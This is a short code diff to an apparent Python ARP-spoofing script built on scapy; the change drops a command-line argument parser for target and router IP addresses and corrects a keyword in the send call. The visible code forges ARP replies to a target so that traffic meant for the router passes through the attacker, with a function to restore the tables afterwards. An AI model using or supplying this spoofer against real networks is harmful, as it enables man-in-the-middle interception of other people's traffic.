@@ -3,17 +3,8 @@
 import scapy.all as scapy
 import time
 import sys
-import argparse
 
 from pip._vendor.distlib.compat import raw_input
-
-def getarguments():
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-t", "--target_ip", dest="target_ip", help="enter the target ip: ")
-    parser.add_argument("-r", "--router_ip", dest="router_ip", help="enter the ip for the router: ")
-    options = parser.parse_args()
-    return options
-
 
 def getting_mac(ip):
 
@@ -31,7 +22,7 @@ def spoof(target_ip,spoof_ip):
 # packet is storing the response that is sent to the target
     target_mac=getting_mac(target_ip)
     packet=(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip))
-    scapy.send(packet, Verbose=False)
+    scapy.send(packet, verbose=False)
 
 # for connecting the target back to the router doing everything normal
 def reverse(destination_ip,router_ip):
